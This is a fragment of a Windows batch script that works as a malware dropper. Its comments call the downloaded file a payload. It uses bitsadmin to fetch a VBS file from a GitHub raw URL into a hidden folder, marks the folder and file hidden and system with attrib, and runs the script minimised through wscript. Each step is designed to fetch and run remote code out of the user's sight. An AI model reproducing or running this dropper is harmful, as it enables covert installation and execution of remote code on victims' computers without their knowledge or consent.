...
REM Download payload files to hidden folder using BITSAdmin
bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs "%hiddenFolder%\myscript.vbs"

REM Set hidden attribute for files and folder
attrib +h +s "%hiddenFolder%"
attrib +h +s "%hiddenFolder%\myscript.vbs"

REM Run payload silently and pass %hiddenFolder% variable
start /min "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"
